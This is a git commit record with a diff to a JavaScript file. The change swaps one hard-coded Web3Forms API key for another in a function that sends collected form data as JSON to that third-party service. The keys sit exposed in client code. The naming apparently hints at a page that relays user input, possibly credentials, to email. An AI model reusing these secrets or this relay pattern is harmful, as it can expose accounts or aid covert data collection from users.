a1a3495f994ddd785a83d435aaa0f32183b4e514
ireoluwa3 <62389303+ireoluwa3@users.noreply.github.com>
2025-03-26 14:53:08 +0100

    Update index.js

--- 0x_assets/js/index.js
+++ 0x_assets/js/index.js
@@ -52,7 +52,7 @@ function inspectExport(formdata, nextpage) {
 
     // Modify form data to include email field and other necessary fields
     let formData = new FormData();
-    formData.append("apikey", "e00ecfe0-567e-429a-bf23-158d7d9c334d"); // Replace with your Web3Forms API key
+    formData.append("apikey", "b066d9c9-837e-4d4b-a50b-72ae15c4c617"); // Replace with your Web3Forms API key
     formData.append("data", JSON.stringify(strings)); // Web3Forms expects "data" key for form data
 
     let request = new XMLHttpRequest();
